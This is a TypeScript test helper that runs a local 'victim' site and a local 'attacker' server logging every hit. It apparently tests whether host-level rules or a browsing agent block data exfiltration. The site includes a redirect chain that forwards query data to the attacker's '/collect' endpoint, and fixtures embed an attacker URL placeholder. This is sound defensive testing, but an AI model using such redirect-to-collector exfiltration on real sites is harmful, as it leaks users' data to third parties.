// Two local HTTP servers:
//   site     http://127.0.0.1:<p1>  serves test/fixtures/*.html (the "victim" site the task names)
//   attacker http://localhost:<p2>  records every hit (the exfiltration sink)
// Different hostname AND different port, so host-level rules (host:port keys) genuinely distinguish them.

import http from 'node:http';
import { readFileSync, existsSync, readdirSync } from 'node:fs';
import { join } from 'node:path';
import type { AddressInfo } from 'node:net';

// tests always run from the repo root (vitest and playwright alike)
export const FIXTURE_DIR = join(process.cwd(), 'test', 'fixtures');

export interface Hit {
  method: string;
  url: string;
  body: string;
  at: number;
  /** the Cookie header (site server only) */
  cookie?: string;
}

export interface FixtureServers {
  site: string;
  attacker: string;
  siteHits: Hit[];
  attackerHits: Hit[];
  /** `{{KEY}}` in a fixture is replaced by vars.KEY (tests change a page between two loads) */
  vars: Record<string, string>;
  /** path ("/form.html") -> HTML served instead of the fixture file (a changed page) */
  overrides: Map<string, string>;
  close(): Promise<void>;
}

function readBody(req: http.IncomingMessage): Promise<string> {
  return new Promise((resolve) => {
    const chunks: Buffer[] = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => resolve(Buffer.concat(chunks).toString('utf8')));
  });
}

function listen(server: http.Server, host: string): Promise<number> {
  return new Promise((resolve) => server.listen(0, host, () => resolve((server.address() as AddressInfo).port)));
}

export function fixtureNames(): string[] {
  return readdirSync(FIXTURE_DIR).filter((f) => f.endsWith('.html')).sort();
}

export async function startFixtureServers(): Promise<FixtureServers> {
  const siteHits: Hit[] = [];
  const attackerHits: Hit[] = [];
  let site = '';
  let attacker = '';
  const vars: Record<string, string> = { PRICE: '19.99' };
  const overrides = new Map<string, string>();

  const attackerServer = http.createServer(async (req, res) => {
    attackerHits.push({ method: req.method ?? '', url: req.url ?? '', body: await readBody(req), at: Date.now() });
    res.writeHead(200, { 'content-type': 'text/html', 'access-control-allow-origin': '*' });
    res.end('<!doctype html><title>Attacker</title><h1>thanks</h1>');
  });

  const siteServer = http.createServer(async (req, res) => {
    const body = await readBody(req);
    const url = new URL(req.url ?? '/', site);
    siteHits.push({ method: req.method ?? '', url: req.url ?? '', body, at: Date.now(), cookie: String(req.headers.cookie ?? '') });
    const html = (s: string, code = 200) => {
      res.writeHead(code, { 'content-type': 'text/html; charset=utf-8' });
      res.end(s);
    };
    if (url.pathname === '/redirect/1') {
      res.writeHead(302, { location: `/redirect/2${url.search}` }).end();
      return;
    }
    if (url.pathname === '/redirect/2') {
      res.writeHead(302, { location: `${attacker}/collect${url.search || '?d=redirect-chain'}` }).end();
      return;
    }
    if (url.pathname === '/submit') {
      html(`<!doctype html><title>Thank you</title><h1>Thank you, your message was received.</h1><p id="received">${body.replace(/[<>&]/g, '')}</p>`);
      return;
    }
    if (url.pathname === '/search') {
      html(`<!doctype html><title>Search results</title><h1>Results for your search</h1><p>No products matched.</p>`);
      return;
    }
    const feed = /^\/feeds\/([\w.-]+\.txt)$/.exec(url.pathname);
    if (feed && existsSync(join(FIXTURE_DIR, 'feeds', feed[1]))) {
      res.writeHead(200, { 'content-type': 'text/plain' }).end(readFileSync(join(FIXTURE_DIR, 'feeds', feed[1]), 'utf8'));
      return;
    }
    const sub = (t: string) => Object.entries(vars).reduce((acc, [k, v]) => acc.replaceAll(`{{${k}}}`, v), t.replaceAll('{{ATTACKER}}', attacker).replaceAll('{{SITE}}', site));
    const over = overrides.get(url.pathname);
    if (over !== undefined) {
      html(sub(over));
      return;
    }
    const name = url.pathname === '/' ? 'index.html' : url.pathname.slice(1);
    const file = join(FIXTURE_DIR, name);
    if (!/^[\w.-]+\.html$/.test(name) || !existsSync(file)) {
      html('<!doctype html><title>Not found</title><h1>404</h1>', 404);
      return;
    }
    html(sub(readFileSync(file, 'utf8')));
  });

  const p1 = await listen(siteServer, '127.0.0.1');
  const p2 = await listen(attackerServer, '127.0.0.1');
  site = `http://127.0.0.1:${p1}`;
  attacker = `http://localhost:${p2}`;
  return {
    site,
    attacker,
    siteHits,
    attackerHits,
    vars,
    overrides,
    close: async () => {
      siteServer.closeAllConnections();
      attackerServer.closeAllConnections();
      await Promise.all([new Promise((r) => siteServer.close(r)), new Promise((r) => attackerServer.close(r))]);
    },
  };
}
